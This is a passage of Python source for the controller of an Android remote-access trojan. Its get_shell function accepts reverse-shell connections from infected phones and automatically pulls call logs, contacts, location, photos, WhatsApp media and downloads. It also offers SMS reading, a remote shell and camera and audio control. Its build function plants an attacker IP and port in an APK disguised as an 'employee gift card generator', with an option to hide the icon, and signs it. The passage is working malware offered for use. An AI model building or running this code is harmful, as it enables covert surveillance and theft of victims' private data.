                        clean_filename = "".join(c for c in filename_only if c.isalnum() or c in '._-')
                        output_path = f"{device_folder}{os.sep}whatsapp_{i:02d}_{clean_filename}"
                        
                        with open(output_path, 'wb') as f:
                            f.write(file_data)
                        
                        size_kb = len(file_data) / 1024
                        print(stdOutput("success")+f"✓ {size_kb:.1f} KB")
                        downloaded += 1
                    else:
                        print(stdOutput("warning")+f"✗ Empty file")
                        
                elif b"error" in initial_data[:50].lower() or b"failed" in initial_data[:50].lower():
                    try:
                        msg = initial_data.decode("UTF-8", errors="ignore")
                        print(stdOutput("error")+f"✗ Server error: {msg.strip()}")
                    except:
                        print(stdOutput("error")+f"✗ Server error")
                else:
                    print(stdOutput("warning")+f"✗ No valid response")
                    
            except Exception as e:
                print(stdOutput("error")+f"✗ Download failed: {e}")
            finally:
                # Reset timeout
                client.settimeout(10.0)
                
        print(stdOutput("success")+f"💬 Downloaded {downloaded}/{len(media_paths)} WhatsApp media files")
        return downloaded > 0
        
    except Exception as e:
        print(stdOutput("error")+f"WhatsApp media download failed: {e}")
        return False

def get_shell(ip,port):
    global shutdown_flag
    soc = socket.socket() 
    soc = socket.socket(type=socket.SOCK_STREAM)
    try:
        # Restart the TCP server on exit
        soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        soc.bind((ip, int(port)))
    except Exception as e:
        print(stdOutput("error")+"\033[1m %s"%e);exit()
    except KeyboardInterrupt:
        print("\n" + stdOutput("info") + "Shutting down...")
        soc.close()
        sys.exit(0)

    soc.listen(2)
    soc.settimeout(1.0)  # Set timeout for accept() to allow checking shutdown_flag
    print(banner)
    
    # Track which commands have succeeded across reconnections
    completed_commands = set()
    device_folder = None  # Track device-specific folder
    
    while True:
        if shutdown_flag:
            print(stdOutput("info") + "Shutdown requested, closing socket...")
            soc.close()
            sys.exit(0)
        
        try:
            print(stdOutput("info")+"\033[1mWaiting for Connections...\033[0m")
            conn, addr = soc.accept()
            conn.settimeout(30.0)  # 30 second timeout
            clear()
            print("\033[1m\033[33mGot connection from \033[31m"+"".join(str(addr))+"\033[0m")
            print(" ")
        except socket.timeout:
            continue  # Timeout allows checking shutdown_flag
        except KeyboardInterrupt:
            print("\n" + stdOutput("info") + "Shutting down...")
            soc.close()
            sys.exit(0)
        
        try:
            # Wait for and read the welcome message to get device info
            welcome_msg = ""
            device_identifier = None
            
            try:
                # Read the welcome message that contains device model
                conn.settimeout(5.0)  # Short timeout for welcome message
                welcome_data = conn.recv(1024).decode("UTF-8")
                
                if "welcome to reverse shell of" in welcome_data:
                    # Extract device model from welcome message
                    model_part = welcome_data.split("welcome to reverse shell of")[1].strip()
                    device_model = model_part.replace("\n", "").replace(" ", "_")
                    
                    # Clean up the device model - remove invalid characters
                    device_model = "".join(c for c in device_model if c.isalnum() or c in "_-")
                    
                    # Create daily folder structure: DeviceModel_YYYYMMDD
                    date_stamp = time.strftime("%Y%m%d")
                    device_identifier = f"{device_model}_{date_stamp}"
                    
                    print(stdOutput("info")+f"Device identified: {model_part.strip()}")
                    welcome_msg = welcome_data
                    
            except Exception as e:
                print(stdOutput("warning")+f"Could not read welcome message: {e}")
            
            # Fallback naming with IP and date for uniqueness
            if not device_identifier:
                device_ip = addr[0].replace('.', '_')
                date_stamp = time.strftime("%Y%m%d")
                device_identifier = f"device_{device_ip}_{date_stamp}"
                print(stdOutput("info")+f"Using fallback identifier: {device_identifier}")
            
            # Create device folder (daily folder)
            device_folder = f"Dumps/{device_identifier}"
            if not os.path.exists(device_folder):
                os.makedirs(device_folder)
                print(stdOutput("info")+f"Created device folder: {device_folder}")
            else:
                print(stdOutput("info")+f"Using existing device folder: {device_folder}")
                
            # Create session subfolder for this specific connection
            session_time = time.strftime("%H%M%S")
            session_folder = f"{device_folder}/session_{session_time}"
            
            # Check if we should use session folders (only if there are already files in the daily folder)
            existing_files = [f for f in os.listdir(device_folder) if os.path.isfile(os.path.join(device_folder, f))]
            
            if existing_files:
                # There are already files, use session subfolder
                if not os.path.exists(session_folder):
                    os.makedirs(session_folder)
                print(stdOutput("info")+f"Created session folder: {session_folder}")
                device_folder = session_folder  # Use session folder for this connection
            # Otherwise, use the daily folder directly
            
            # Reset timeout for normal operations
            conn.settimeout(10.0)
            
            # Show previously completed commands
            if completed_commands:
                print(stdOutput("info")+"Previously completed: " + ", ".join(sorted(completed_commands)))
                print(" ")
            
            # Optimized parallel auto-retrieval system  
            priority_cmds = []
            if 'call_logs' not in completed_commands:
                priority_cmds.append('call_logs')
            if 'contacts' not in completed_commands:
                priority_cmds.append('contacts')
            if 'location' not in completed_commands:
                priority_cmds.append('location')
            if 'photos_auto' not in completed_commands:
                priority_cmds.append('photos_auto')
            if 'whatsapp_media_auto' not in completed_commands:
                priority_cmds.append('whatsapp_media_auto')
            if 'downloads' not in completed_commands:
                priority_cmds.append('downloads')
            
            # Execute commands using optimized parallel processing
            if priority_cmds:
                executeParallelCommands(conn, priority_cmds, device_folder, completed_commands)
            else:
                print(stdOutput("info")+"All auto-retrieval commands already completed")
            
            # Now enter manual command loop
            while True:
                try:
                    msg = conn.recv(4024).decode("UTF-8")
                    if not msg:  # Empty message means connection closed
                        print(stdOutput("warning")+"Device disconnected")
                        break
                        
                    if(msg.strip() == "IMAGE"):
                        getImage(conn)
                    elif("readSMS" in msg.strip()):
                        content = msg.strip().split(" ")
                        data = content[1]
                        readSMS(conn,data)
                    elif(msg.strip() == "SHELL"):
                        shell(conn)
                    elif(msg.strip() == "getLocation"):
                        getLocation(conn)
                    elif(msg.strip() == "stopVideo123"):
                        stopVideo(conn)
                    elif(msg.strip() == "stopAudio"):
                        stopAudio(conn)
                    elif(msg.strip() == "callLogs"):
                        callLogs(conn)
                    elif(msg.strip() == "help"):
                        help()
                    else:
                        print(stdOutput("error")+msg) if "Unknown Command" in msg else print("\033[1m"+msg) if "Hello there" in msg else print(msg)
                    
                    message_to_send = input("\033[1m\033[36mInterpreter:/> \033[0m")+"\n"
                    
                    # Handle file download commands before sending
                    if message_to_send.strip().startswith("getMediaFile "):
                        filepath = message_to_send.strip().split(" ", 1)[1]
                        conn.send(message_to_send.encode("UTF-8"))
                        time.sleep(1)
                        downloadMediaFile(conn, filepath)
                        continue
                    elif message_to_send.strip().startswith("getDataFile "):
                        filepath = message_to_send.strip().split(" ", 1)[1]
                        conn.send(message_to_send.encode("UTF-8"))
                        time.sleep(1)
                        downloadDataFile(conn, filepath)
                        continue
                    elif message_to_send.strip() == "downloadPhotos":
                        print(stdOutput("info")+"Manually triggering photo download...")
                        autoDownloadPhotos(conn, device_folder, max_photos=10)
                        continue
                    
                    conn.send(message_to_send.encode("UTF-8"))
                    
                    if message_to_send.strip() == "exit":
                        print(" ")
                        print("\033[1m\033[32m\t (∗ ･‿･)ﾉ゛\033[0m")
                        sys.exit()
                    if(message_to_send.strip() == "clear"):
                        clear()
                        
                except (ConnectionResetError, BrokenPipeError, OSError, socket.timeout) as e:
                    print(stdOutput("warning")+f"Connection lost: {e}")
                    break  # Exit manual command loop, go back to waiting for connections
                except KeyboardInterrupt:
                    print("\n" + stdOutput("info")+"Shutting down gracefully...")
                    try:
                        conn.close()
                    except:
                        pass
                    soc.close()
                    sys.exit(0)
                    
        except (ConnectionResetError, BrokenPipeError, OSError) as e:
            print(stdOutput("warning")+f"Connection error: {e}")
        except KeyboardInterrupt:
            print("\n" + stdOutput("info")+"Shutting down...")
            try:
                conn.close()
            except:
                pass
            soc.close()
            sys.exit(0)
        finally:
            try:
                conn.close()
            except:
                pass
            print(stdOutput("info")+"Connection closed. Waiting for reconnection...")
            print(" ")


def connection_checker(socket,queue):
    conn, addr = socket.accept()
    queue.put([conn,addr])
    return conn,addr


def build(ip,port,output,ngrok=False,ng=None,icon=None):
    editor = "Compiled_apk"+direc+"smali"+direc+"com"+direc+"employee"+direc+"giftcard"+direc+"config.smali"
    try:
        file = open(editor,"r").readlines()
        #Very much uncertaninity but cant think any other way to do it xD
        file[18]=file[18][:21]+"\""+ip+"\""+"\n"
        file[23]=file[23][:21]+"\""+port+"\""+"\n"
        file[28]=file[28][:15]+" 0x0"+"\n" if icon else file[28][:15]+" 0x1"+"\n"
        str_file="".join([str(elem) for elem in file])
        open(editor,"w").write(str_file)
    except Exception as e:
        print(e)
        sys.exit()
    java_version = execute("java -version")
    if java_version.returncode: print(stdOutput("error")+"Java not installed or found");exit()
    #version_no = re.search(pattern, java_version.stderr).groups()[0]
    # if float(version_no) > 1.8: print(stdOutput("error")+"Java 8 is required, Java version found "+version_no);exit()
    print(stdOutput("info")+"\033[0mGenerating APK")
    outFileName = output if output else "employee-giftcard-generator.apk"
    que = queue.Queue()
    t = threading.Thread(target=executeCMD,args=["java -jar Jar_utils/apktool.jar b Compiled_apk  -o "+outFileName,que],)
    t.start()
    while t.is_alive(): animate("Building APK ")
    t.join()
    print(" ")
    resOut = que.get()
    if not resOut.returncode:
        print(stdOutput("success")+"Successfully apk built in \033[1m\033[32m"+getpwd(outFileName)+"\033[0m")
        print(stdOutput("info")+"\033[0mSigning the apk")
        t = threading.Thread(target=executeCMD,args=["java -jar Jar_utils/sign.jar -a "+outFileName+" --overwrite",que],)
        t.start()
        while t.is_alive(): animate("Signing Apk ")
        t.join()
        print(" ")
        resOut = que.get()
        if not resOut.returncode:
            print(stdOutput("success")+"Successfully signed the apk \033[1m\033[32m"+outFileName+"\033[0m")
            if ngrok:
                clear()
                get_shell("0.0.0.0",8000) if not ng else get_shell("0.0.0.0",ng)
            print(" ")
        else:
            print("\r"+resOut.stderr)
            print(stdOutput("error")+"Signing Failed")
    else:
        print("\r"+resOut.stderr)
        print(stdOutput("error")+"Building Failed")
